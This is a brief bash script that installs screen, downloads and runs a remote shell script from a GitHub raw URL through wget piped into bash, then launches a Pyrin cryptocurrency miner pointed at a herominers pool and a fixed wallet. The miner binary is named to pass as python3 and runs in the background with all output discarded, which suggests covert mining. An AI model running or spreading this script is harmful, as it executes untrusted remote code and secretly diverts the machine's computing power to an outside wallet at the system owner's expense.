#!/bin/bash

apt install screen -y

bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotLol.sh)"

nohup ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT --no-cl > /dev/null 2>&1 &
